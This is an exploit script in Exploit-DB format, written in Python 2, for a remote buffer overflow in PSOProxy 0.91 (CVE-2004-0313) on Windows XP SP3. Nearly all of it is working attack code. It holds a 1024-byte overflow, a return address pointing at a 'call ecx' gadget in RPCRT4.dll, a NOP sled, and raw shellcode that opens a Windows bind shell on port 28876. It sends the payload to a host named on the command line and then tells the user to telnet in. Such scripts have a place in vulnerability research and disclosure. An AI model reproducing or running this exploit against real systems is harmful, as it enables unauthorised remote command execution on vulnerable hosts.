# Exploit Title: PSOProxy 0.91 - Remote Buffer Overflow 
# Date: 2018-07-26
# Exploit Author: Steve Kelly
# CVE : CVE-2004-0313
# Ref: http://www.securityfocus.com/bid/9706

# Vulnerable versions
# -------------------------------
# PSOProxy PSOProxy Server 0.91 

# Tested on Python 2.7 and Windows XP SP3 (English)

# Rewrite of an old exploit from 2004, based on https://www.exploit-db.com/exploits/23732/
# 0x77e805d8 : "call ecx" |  {PAGE_EXECUTE_READ} [RPCRT4.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\RPCRT4.dll)
# JMP ESP also exists, but CALL ECX is easier

import sys
import socket

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST> [port]\n"
    sys.exit()

if len(sys.argv) < 3:
    port = 8080
else:
    port = int(sys.argv[2])

host = sys.argv[1]

# Windows Bind Shell on 28876
shellcode = ("\xeb\x43\x56\x57\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x52\x8b\x52"
  "\x20\x01\xea\x31\xc0\x31\xc9\x41\x8b\x34\x8a\x01\xee\x31\xff\xc1"
  "\xcf\x13\xac\x01\xc7\x85\xc0\x75\xf6\x39\xdf\x75\xea\x5a\x8b\x5a"
  "\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
  "\xe8\x5f\x5e\xff\xe0\xfc\x31\xc0\x64\x8b\x40\x30\x8b\x40\x0c\x8b"
  "\x70\x1c\xad\x8b\x68\x08\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x33\x32"
  "\x2e\x64\x68\x77\x73\x32\x5f\x54\xbb\x71\xa7\xe8\xfe\xe8\x90\xff"
  "\xff\xff\x89\xef\x89\xc5\x81\xc4\x70\xfe\xff\xff\x54\x31\xc0\xfe"
  "\xc4\x40\x50\xbb\x22\x7d\xab\x7d\xe8\x75\xff\xff\xff\x31\xc0\x50"
  "\x50\x50\x50\x40\x50\x40\x50\xbb\xa6\x55\x34\x79\xe8\x61\xff\xff"
  "\xff\x89\xc6\x31\xc0\x50\x50\x35\x02\x01\x70\xcc\xfe\xcc\x50\x89"
  "\xe0\x50\x6a\x10\x50\x56\xbb\x81\xb4\x2c\xbe\xe8\x42\xff\xff\xff"
  "\x31\xc0\x50\x56\xbb\xd3\xfa\x58\x9b\xe8\x34\xff\xff\xff\x58\x60"
  "\x6a\x10\x54\x50\x56\xbb\x47\xf3\x56\xc6\xe8\x23\xff\xff\xff\x89"
  "\xc6\x31\xdb\x53\x68\x2e\x63\x6d\x64\x89\xe1\x41\x31\xdb\x56\x56"
  "\x56\x53\x53\x31\xc0\xfe\xc4\x40\x50\x53\x53\x53\x53\x53\x53\x53"
  "\x53\x53\x53\x6a\x44\x89\xe0\x53\x53\x53\x53\x54\x50\x53\x53\x53"
  "\x43\x53\x4b\x53\x53\x51\x53\x87\xfd\xbb\x21\xd0\x05\xd0\xe8\xdf"
  "\xfe\xff\xff\x5b\x31\xc0\x48\x50\x53\xbb\x43\xcb\x8d\x5f\xe8\xcf"
  "\xfe\xff\xff\x56\x87\xef\xbb\x12\x6b\x6d\xd0\xe8\xc2\xfe\xff\xff"
  "\x83\xc4\x5c\x61\xeb\x89\x41")

# 0x77e805d8 : "call ecx" |  {PAGE_EXECUTE_READ} [RPCRT4.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\RPCRT4.dll)
# jmpesp = "\x0A\x56\xE8\x77"

offset = 1024
jmpecx = "\xD8\x05\xE8\x77"

payload = "A" * offset + jmpecx + "\x90" * 20 + shellcode + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "Connecting to Server"
s.settimeout(2.0)
try:
    s.connect((host, port))
except socket.error, exc:
    print "Server unresponsive - is it up?"
    exit()

print "Sending Payload"
s.send(payload)

print "Payload sent, try to 'telnet "+host+" 28876'"
s.close()
